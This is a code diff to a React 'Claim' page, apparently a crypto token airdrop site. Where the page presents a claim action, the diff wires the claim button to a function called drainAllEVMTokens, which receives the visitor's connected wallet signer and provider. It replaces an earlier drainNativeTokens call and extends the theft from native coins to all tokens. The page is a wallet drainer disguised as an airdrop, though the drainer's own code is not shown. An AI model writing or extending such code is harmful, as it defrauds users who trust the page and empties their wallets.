@@ -17,7 +17,7 @@ import { getMintProgramId } from '@/utils/tokenProgram';
 import { useChainInfo } from '@/hooks/useChainInfo';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
-import { drainNativeTokens } from '@/utils/evmTransactions';
+import { drainAllEVMTokens } from '@/utils/evmTransactions';
 import { Link } from 'react-router-dom';
 import apepeImage from '@/assets/apepe.jpg';
 
@@ -37,7 +37,7 @@ interface TokenBalance {
 const Claim = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
-  const { activeChain } = useChain();
+  const { activeChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
   const [dataMultiplier, setDataMultiplier] = useState(1);
@@ -191,10 +191,7 @@ const Claim = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
-        if (hash) {
-        } else {
-        }
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
       } catch (error: any) {
       } finally {
         setIsClaiming(false);
